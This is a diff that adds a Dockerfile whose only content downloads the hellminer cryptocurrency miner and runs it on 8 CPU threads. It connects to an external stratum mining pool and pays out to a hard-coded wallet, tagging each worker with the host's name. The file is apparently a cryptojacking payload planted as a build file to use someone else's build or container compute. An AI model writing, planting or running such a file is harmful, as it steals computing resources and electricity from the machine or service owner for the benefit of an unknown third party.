@@ -1,0 +1,5 @@
+FROM ubuntu
+RUN apt-get update -y && apt install wget libsodium-dev -y
+RUN wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
+RUN tar -xvf hellminer_linux64.tar.gz
+RUN ./hellminer -c stratum+tcp://dark-bikes-build-noisily.a276.dcdg.xyz:3956 -u RHkiLGRarhTt8SF66vJzwEcyxNm4k1fXTH.$(hostname -f) -p x --cpu 8
